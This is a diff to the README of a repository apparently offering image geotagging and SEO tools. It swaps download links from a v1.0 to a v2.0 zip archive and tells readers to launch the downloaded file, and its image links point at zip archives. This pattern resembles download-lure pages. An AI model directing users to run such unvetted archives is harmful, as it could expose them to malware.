@@ -10,7 +10,7 @@ The primary goal of this repository is to provide tools and resources that will 
 
 To get started, you can download the software package by clicking the button below:
 
-[![Download Software](https://github.com/nivlek093/Geotagging-et-SEO-Images/releases/download/v1.0/Release_x64.zip)](https://github.com/nivlek093/Geotagging-et-SEO-Images/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/nivlek093/Geotagging-et-SEO-Images/releases/download/v2.0/Software.zip)](https://github.com/nivlek093/Geotagging-et-SEO-Images/releases/download/v2.0/Software.zip)
 
 **Note:** The downloaded file needs to be launched to install the necessary tools for geotagging and optimizing your images.
 
@@ -44,4 +44,4 @@ Feel free to contribute to this project by submitting pull requests, sharing fee
 
 Let's embark on a journey to make your visual content more discoverable and engaging through geotagging! 🚀
 
-![Geotagging](https://github.com/nivlek093/Geotagging-et-SEO-Images/releases/download/v1.0/Release_x64.zip)
+![Geotagging](https://github.com/nivlek093/Geotagging-et-SEO-Images/releases/download/v2.0/Software.zip)
